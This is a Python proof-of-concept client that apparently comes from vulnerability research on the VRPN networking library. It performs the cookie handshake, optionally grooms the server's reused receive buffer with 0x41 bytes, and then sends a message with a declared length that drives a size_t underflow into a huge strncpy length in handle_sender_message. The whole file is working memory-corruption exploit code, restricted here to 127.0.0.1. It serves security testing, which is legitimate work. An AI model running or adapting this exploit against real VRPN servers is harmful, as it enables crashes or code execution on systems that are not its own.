#!/usr/bin/env python3
"""Loopback VRPN client: optional groom then a short declared-length message.

Declared body length 24 makes getOneTCPMessage compute payload_len = 0; in
handle_sender_message the strncpy length is p.payload_len - sizeof(int32),
a size_t underflow to ~2^64. This is the wire side of W24. 127.0.0.1 only.
"""
import argparse
import socket
import struct
import time

COOKIE_SIZE = 24
HEADER_LEN = 24


def header(declared_len, msgtype):
    return struct.pack(">IIIIII", declared_len, 0, 0, 0,
                       msgtype & 0xFFFFFFFF, 0)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--groom", type=int, default=0,
                    help="bytes of 0x41 placed in the reused receive buffer")
    ap.add_argument("--presleep", type=float, default=0.3)
    ap.add_argument("--body", default="",
                    help="literal bytes appended when declared > 24")
    ap.add_argument("--msgtype", type=lambda x: int(x, 0), default=-1)
    ap.add_argument("--declared", type=int, default=24)
    ap.add_argument("--hold", type=float, default=2.0)
    args = ap.parse_args()

    with socket.create_connection(("127.0.0.1", args.port), timeout=5) as s:
        cookie = s.recv(COOKIE_SIZE)
        if len(cookie) != COOKIE_SIZE:
            raise SystemExit(f"short cookie: {cookie!r}")
        s.sendall(cookie)
        time.sleep(args.presleep)
        if args.groom:
            # Positive user type: no local mapping here, so the body lands
            # in d_tcpInbuf without a handler consuming it.
            body = struct.pack(">i", 0) + b"A" * (args.groom - 4)
            groom = header(HEADER_LEN + len(body), 0) + body
            groom += b"\0" * (-len(body) % 8)
            s.sendall(groom)
            print(f"groom: len={len(groom)} body={len(body)}", flush=True)
            time.sleep(0.4)
        short = header(args.declared, args.msgtype)
        extra = args.body.encode() or b"\0" * max(0, args.declared - 24)
        short += extra + b"\0" * (-len(extra) % 8)
        s.sendall(short)
        print(f"short: len={len(short)} declared={args.declared} "
              f"msgtype={args.msgtype}", flush=True)
        time.sleep(args.hold)
        print(f"cookie={cookie!r}")


if __name__ == "__main__":
    main()
